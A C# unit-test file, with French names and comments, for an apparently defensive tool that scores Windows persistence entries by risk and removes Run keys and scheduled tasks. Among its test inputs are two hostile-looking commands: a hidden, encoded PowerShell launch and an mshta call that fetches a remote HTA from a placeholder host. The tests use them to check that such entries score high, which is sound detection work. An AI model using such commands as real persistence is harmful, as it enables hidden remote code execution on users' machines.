using Microsoft.Win32;

namespace CoreGuard.Behavior.Tests;

[TestClass]
public class PersistenceRiskTests
{
    [TestMethod]
    public void ProgrammeInstalle_RisqueFaible()
    {
        var a = PersistenceRisk.Assess("RunKey", @"""C:\Program Files\Editeur\app.exe"" --minimized");
        Assert.AreEqual(PersistenceRiskLevel.Low, a.Level);
        Assert.AreEqual(0, a.Reasons.Count);
    }

    [TestMethod]
    public void ScriptDansTemp_RisqueMoyenOuPlus()
    {
        var a = PersistenceRisk.Assess("ScheduledTask", @"C:\Users\x\AppData\Local\Temp\CoreGuardDemo\persistance\inoffensif.cmd");
        Assert.AreEqual(PersistenceRiskLevel.High, a.Level); // dossier temporaire (+2) et script (+2)
        Assert.AreEqual(2, a.Reasons.Count);
    }

    [TestMethod]
    public void PowerShellEncodeMasque_RisqueEleve()
    {
        var a = PersistenceRisk.Assess("RunKey", "powershell.exe -w hidden -enc SQBFAFgA");
        Assert.AreEqual(PersistenceRiskLevel.High, a.Level);
        StringAssert.Contains(a.Summary, "encodée");
        StringAssert.Contains(a.Summary, "masquée");
    }

    [TestMethod]
    public void Lolbin_Telechargement_RisqueEleve()
    {
        var a = PersistenceRisk.Assess("RunKey", "mshta.exe https://exemple.invalid/x.hta");
        Assert.AreEqual(PersistenceRiskLevel.High, a.Level);
    }

    [TestMethod]
    public void CommandeVide_NeLevePas()
    {
        var a = PersistenceRisk.Assess("Service", "");
        Assert.AreEqual(PersistenceRiskLevel.Low, a.Level); // service seul : +1
        Assert.AreEqual(1, a.Reasons.Count);
    }

    [TestMethod]
    public void RetraitValeurRun_SupprimeVraimentLaValeur()
    {
        const string path = @"SOFTWARE\CoreGuardTests\Run";
        string name = "Test" + Guid.NewGuid().ToString("N")[..8];
        using (var key = Registry.CurrentUser.CreateSubKey(path)) key.SetValue(name, "inoffensif.exe");
        try
        {
            var r = PersistenceRemover.Remove(new PersistenceEvent("RunKey", $"CurrentUser\\{path}\\{name}", "inoffensif.exe"));
            Assert.IsTrue(r.Removed, r.Message);
            using var check = Registry.CurrentUser.OpenSubKey(path);
            Assert.IsNull(check?.GetValue(name));

            var again = PersistenceRemover.Remove(new PersistenceEvent("RunKey", $"CurrentUser\\{path}\\{name}", "inoffensif.exe"));
            Assert.IsFalse(again.Removed);
        }
        finally
        {
            Registry.CurrentUser.DeleteSubKeyTree(@"SOFTWARE\CoreGuardTests", throwOnMissingSubKey: false);
        }
    }

    [TestMethod]
    public void RetraitValeurRun_CibleIllisible_EchoueProprement()
    {
        Assert.IsFalse(PersistenceRemover.Remove(new PersistenceEvent("RunKey", "nimporte", "")).Removed);
        Assert.IsFalse(PersistenceRemover.Remove(new PersistenceEvent("RunKey", @"Inconnue\a\b", "")).Removed);
    }

    [TestMethod]
    public void TachesPlanifiees_LectureNeLevePas()
    {
        var tasks = ScheduledTasks.ReadAll();
        Assert.IsNotNull(tasks);
        Assert.IsTrue(tasks.Keys.All(k => k.StartsWith('\\')));
    }

    [TestMethod]
    public void TachePlanifiee_SuppressionAbsente_Echoue()
    {
        Assert.IsFalse(ScheduledTasks.Delete(@"\CoreGuardTacheInexistante" + Guid.NewGuid().ToString("N")[..6], out var err));
        Assert.IsNotNull(err);
    }
}
